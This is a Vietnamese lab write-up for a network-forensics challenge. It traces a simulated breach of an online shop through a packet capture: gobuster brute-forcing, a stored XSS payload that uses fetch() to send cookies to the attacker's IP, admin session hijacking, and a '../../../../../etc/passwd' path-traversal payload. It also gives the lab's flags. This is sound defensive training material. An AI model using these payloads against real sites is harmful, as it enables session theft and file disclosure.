---
title: '[Level-3]-RetailBreach'
date: 2026-03-16

---

# Lab Report - RetailBreach
**DatHN5 - SO3 - FSAS**
---

Investigate network traffic with Wireshark to identify attacker TTPs, extract XSS payloads and session tokens, and determine exploited web application vulnerabilities. 

**Category**: Network Forensics 
**Tactics**: Reconnaissance, Initial Access, Execution, Defense Evasion, Credential Access, Discovery, Lateral Movement 
**Tools**: Wireshark, Network Miner, Brim

#### Scenario
In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

- Tình huống:
    - Có đăng nhập admin bất thường vào ban đêm.
    - Đồng thời khách hàng báo cáo tài khoản có dấu hiệu bất thường.
    - Nghi ngờ admin bị chiếm quyền và hệ thống có thể bị xâm nhập.
    - Cần phân tích network traffic đã capture để tìm nguồn và cách thức tấn công.



#### Q1 Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?

Để xác định và thu hẹp phạm vi các IP mình xem các Endpoints có xuất hiện trong file PCAP này bằng cách chọn `Statistics -> Endpoints`

![image](https://hackmd.io/_uploads/r1NY69J5-g.png)

Ở đây mình thấy có 3 endpoint với 3 IP có giao tiếp với nhau trong đó có 2 IP `111.224.180.128` và `73.124.17.52` là đáng ngờ với lưu lượng packets cao bất thường nên mình quyết định lọc xem các gói tin liên quan tới hai IP đó để phân tích sâu thêm.

Lọc với cụm `ip.addr==111.224.180.128` mình nhận ra IP `111.224.180.128` là của enduser còn IP `73.124.17.52` là của server, và IP `111.224.180.128` đang liên tục gửi request tới server qua việc gửi SYN flood và liên tục request tới server để khai thác thông tin về hệ thống file

![image](https://hackmd.io/_uploads/Symqki1qbg.png)

![image](https://hackmd.io/_uploads/SyO5Jo19bg.png)


***.***.***.***
>Flag: 111.224.180.128
---
#### Q2 The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?

Mình thấy rằng attacker đang liên tục brute-force tới server để tìm ra các file/path ẩn qua một tool nào đó.

![image](https://hackmd.io/_uploads/H1-m-oy5bg.png)

Để xác định rõ hơn mình chọn 1 gói tin gửi từ IP của attacker và chọn `Follow -> HTTP Stream` để xem các thông tin liên quan tới máy attacker. Kết quả mình quan sát được là `User-Agent` từ máy attacker không phải là của người dùng mà là từ tool có tên là `gobuster` thực hiện

![image](https://hackmd.io/_uploads/S1i2biJ5Ze.png)

********
>Flag: gobuster

---
#### Q3 Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

Để tìm xem attacker đã inject đoạn script độc hại nào mình lọc các gói tin có http request method là POST để xem attacker đã upload hay chỉnh sửa gì đối với hệ thống.

`http.request.method==POST`

![image](https://hackmd.io/_uploads/Sk3dXokcZg.png)


Kết quả trả về là 3 gói tin có chứa request method POST trong đó có 1 gói tin chứa thông tin về đoạn script mà attacker đã inject vào hệ thống đó là

```!
Form item: "review" = "<script>fetch('http://111.224.180.128/' + document.cookie);</script>"
```

Ta có thể thấy attacker đã chèn script vào ô text box có tên là review từ chức năng gửi review của web rồi submit lên server. 

Script của attacker có chức năng như sau: 
- Kích hoạt XSS, khi mà trang "review" hiển thị lại nội dung review mà không escape (mã hóa đầu ra) - ở đây ta nhắc tới admin do thường chỉ admin mới co quyền xem thông tin này. Đoạn script kia sẽ trở thành mã JS thật và chạy trên trình duyệt của ai mở trang đó.
- Khi chạy script sẽ lấy thông tin cookie từ `document.cookie` rồi gửi về máy của attacker qua lệnh 
    - fetch('http://111.224.180.128/' + document.cookie) - Tức là trình duyệt nạn nhân sẽ tự tạo một request tới IP attacker và đính kèm cookie vào URL, để attacker xem trong log và dùng cho mục đích chiếm phiên/giả mạo đăng nhập.

![image](https://hackmd.io/_uploads/BkFsJkgq-g.png)




>Flag: <script>fetch('http://111.224.180.128/' + document.cookie);</script>
---
#### Q4 Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?

Sau khi mà attacker chèn script vào textbox ở chức năng review thì ngay sau đó mình thấy có gói tin thể hiện thông tin là có ai đó với IP `135.143.142.5` có thể là admin login vào trang admin để xem log cụ thể là xem file **error.log**

![image](https://hackmd.io/_uploads/ByHLPsk5bg.png)

![image](https://hackmd.io/_uploads/SJWkdjkcZl.png)

Kiểm tra thời gian thì thấy đó là lúc 2024-03-29 12:09

Sau đo mình có trace xem IP admin này có làm những gì thì thấy admin có vào trang reviews.php, kết quả cho thấy script kia vẫn y nguyên trong box review chứng tỏ rằng scrip kia đã chèn và chạy thành công rồi gửi cookie của admin tới máy attacker.

![image](https://hackmd.io/_uploads/BkUMKye5Zx.png)


![image](https://hackmd.io/_uploads/SyGWDyx5We.png)

---
#### Q5 The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?

Sau khi admin vào trang reviews.php thì attacker đã nhận được token cookie của admin sau đo dùng nó để chiếm session làm việc của admin, thành công truy cập vào trang quản trị mà không cần tới account của admin.

Đây là token cookie của admin khi vào trang reviews.php

`PHPSESSID=lqkctf24s9h9lg67teu8uevn3q`

![image](https://hackmd.io/_uploads/SJSJiJl9bl.png)

Ngay sau đó attacker có được token cookie của admin, hắn trước tiên log vào với account normal điều này thể hiện qua token cookie khác với token của admin

`PHPSESSID=rprah510186vkkdnfhpe11ea4l`

![image](https://hackmd.io/_uploads/r1cLo1gqZl.png)


Ngay sau đó attacker đã dùng token cookie của admin để chiếm session chiếm toàn bộ quyền hạn của một admin, ta có thể thấy qua việc cookie của attacker đã đổi thành cookie của admin

`PHPSESSID=lqkctf24s9h9lg67teu8uevn3q`

![image](https://hackmd.io/_uploads/Syn0sye5Zl.png)

>Flag: lqkctf24s9h9lg67teu8uevn3q

---
#### Q6 Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?

Ngay sau khi có quyền admin attacker đã truy cập vào trang admin dashboard rồi tìm cách truy cập các chức năng của admin

![image](https://hackmd.io/_uploads/Hy6lAJgc-e.png)

Ta có thể thấy attacker đã thử vào `review_manager.php` nhưng gặp lỗi `404` 
Sau đo mình thấy rằng attacker đã vào `log_viewer.php` code server trả về là 200, tiếp đó ta thấy attacker đã tận dụng `log_viewer.php` để khai thác lỗ hổng path traversal.

![image](https://hackmd.io/_uploads/H15UJxgqWx.png)

Server đã không xử lý block các ký tự nguy hiểm như `..`, `/`, v.v và khiến attacker thành công khai thác lỗi này thể hiện qua server response với code 200.

![image](https://hackmd.io/_uploads/H1YMeglcZg.png)



---
#### Q7 Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?

Dựa vào thông tin vừa tìm được mình có thể thấy rằng attacker đã dùng payload sau để khai thác lỗ hổng path traversal

Full URL:
```!
http://shopsphere.com/admin/log_viewer.php?file=../../../../../etc/passwd
```

Payload: 
```!
../../../../../etc/passwd
